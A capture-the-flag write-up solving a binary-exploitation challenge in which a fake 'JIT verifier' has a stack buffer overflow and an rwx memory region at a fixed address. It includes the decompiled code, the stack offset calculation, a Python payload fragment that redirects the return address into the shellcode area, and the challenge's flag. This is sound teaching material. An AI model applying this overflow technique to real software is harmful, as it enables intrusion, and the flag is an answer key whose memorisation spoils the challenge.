# mmm

## Description

Tags: _pwn_

## Recon

I was given a binary that implements a "JIT verifier" - a program that accepts shellcode and claims to verify it

Looking at the decompiled source code:

```c
#define JIT_AREA (void*)0x42420000

int main()
{
    char size[050];  // 40 bytes (octal 050 = decimal 40)
    
    printf("How long is your shellcode?\n");
    read(0, size, 0x50);  // Reads 80 bytes into 40-byte buffer
    
    char *mem = mmap(JIT_AREA, atol(size), 7, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    // Allocates memory at 0x42420000 with rwx permissions
    
    printf("Give us your shellcode\n");
    read(0, mem, atol(size));
    
    printf("Looks good to me!\n");
    // TODO: Implement shellcode verifier
    
    return 0;
}
```

### The Vulnerabilities

1. Buffer Overflow: The `size` buffer is only 40 bytes (octal 050), but the program reads 80 bytes (0x50) into it
2. Missing Verification: The comment says "TODO: Implement shellcode verifier" => the shellcode is never verified
3. Executable Memory: The `mmap` call uses protection flag `7` = rwx
4. Predictable Address: The JIT_AREA is hardcoded at `0x42420000`

## Exploitation

### Finding the Offset to the Return Address

Looking at the assembly code:

```assembly
00401b45  push    rbp
00401b46  mov     rbp, rsp
00401b49  sub     rsp, 0x30        # Allocate 48 bytes
```

Converting: `0x30` (hex) = `48` (decimal)
The program allocates 48 bytes on stack

The memory layout after the allocation is:
```
[rbp - 0x30] ─────┬───── size buffer starts (40 bytes)
                  │
[rbp - 0x08] ─────┴───── end of allocated space
[rbp + 0x00] ───────── saved rbp (8 bytes)
[rbp + 0x08] ───────── return address (8 bytes) 
```

To reach the return address from the start of the `size` buffer:
- Distance to saved rbp: `0x30` = 48 bytes
- Distance past saved rbp to return address: `0x08` = 8 bytes

Total offset: 48 + 8 = 56 bytes

### Crafting the Payload

```python
size_str = b"256"                      # Valid size (3 bytes)
padding = b"A" * (56 - len(size_str))  # Fill to return address: 56 - 3 = 53 bytes
ret_addr = p64(JIT_AREA)               # New return address: 0x42420000 (8 bytes)
size = size_str + padding + ret_addr   # Total: 3 + 53 + 8 = 64 bytes
```

Payload breakdown:
- Bytes 0-2: `"256"` - parsed by `atol()` as the size 256
- Bytes 3-55: Padding - fills the 40-byte buffer, crosses saved rbp
- Bytes 56-63: Return address pointing to `0x42420000`

After executing I got the following result:

![Screenshot of console output](./console-output.png)

## Flag

`CLA{my_f1rst_sh3llc0ding_jOxIBfjcAA0x}`
